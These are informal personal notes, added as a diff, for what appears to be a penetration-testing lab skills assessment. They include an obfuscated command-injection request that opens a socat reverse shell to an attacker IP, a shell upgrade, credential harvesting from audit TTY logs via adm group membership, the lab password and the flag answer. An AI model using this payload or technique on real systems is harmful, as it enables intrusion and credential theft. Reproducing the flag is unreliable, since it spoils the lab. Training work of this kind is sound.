@@ -1,0 +1,50 @@
+We left off with obtaining RCE on the monitoring.inlanefreight.local application 
+after a hard-fought battle against filters and blacklists set in place to try to prevent Command Injection attacks. 
+
+not really lol i used curl to get my shit but now we will get a webshell loloadkl;sjughadriklsujfgh thumbs up meme 
+
+change /etc/hosts to -> 10.129.229.147 
+
+
+from this section we know our burp request is going to look like -> 
+
+GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash HTTP/1.1
+Host: monitoring.inlanefreight.local
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Referer: http://monitoring.inlanefreight.local/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
+Connection: close
+
+
+Question 1 - Submit the contents of the flag.txt file in the /home/srvadm directory. 
+1. get socat rev shell from burp request listed above. 
+2. once shell is caught -> python3 -c 'import pty; pty.spawn("/bin/bash")'
+3. id 
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+4. interesting were in adm priv group 
+5. aureport --tty | less
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
+2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
+3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
+4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
+5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
+6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
+7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
+8. 06/01/22 07:13:36 365 1004 ? 4 sh "exit",<nl>
+
+6. so we have creds -> srvadm:ILFreightnixadm!
+7. su arvadm -> enter ILFreightnixadm! 
+8. id uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
+9. $ cat /home/srvadm/flag.txt
+cat /home/srvadm/flag.txt
+b447c27a00e3a348881b0030177000cd
+
+10. also type /bin/bash -i will spawn interactive shell once we switch to srvadm 
